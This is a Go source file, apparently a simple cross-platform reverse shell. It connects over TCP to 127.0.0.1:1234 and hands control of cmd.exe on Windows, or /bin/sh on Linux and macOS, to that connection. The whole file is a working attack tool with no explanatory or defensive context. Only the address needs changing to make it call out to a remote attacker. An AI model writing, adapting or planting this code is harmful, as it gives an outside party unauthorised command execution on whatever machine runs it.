package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

func main() {

	// Establish a TCP connection to the specified address
	connection, err := net.Dial("tcp", "127.0.0.1:1234")
	if err != nil {
		fmt.Println("Failed to connect:", err)
		return
	}
	defer connection.Close()

	// Define command variable
	var cmd *exec.Cmd

	// Select the correct shell command based on the OS
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux", "darwin": // Added macOS support with "darwin"
		cmd = exec.Command("/bin/sh")
	default:
		fmt.Println("Unsupported OS:", runtime.GOOS)
		return
	}

	// Set the command's standard input, output, and error to the TCP connection
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	// Run the command and check for errors
	if err := cmd.Run(); err != nil {
		fmt.Println("Failed to run command:", err)
	}
}
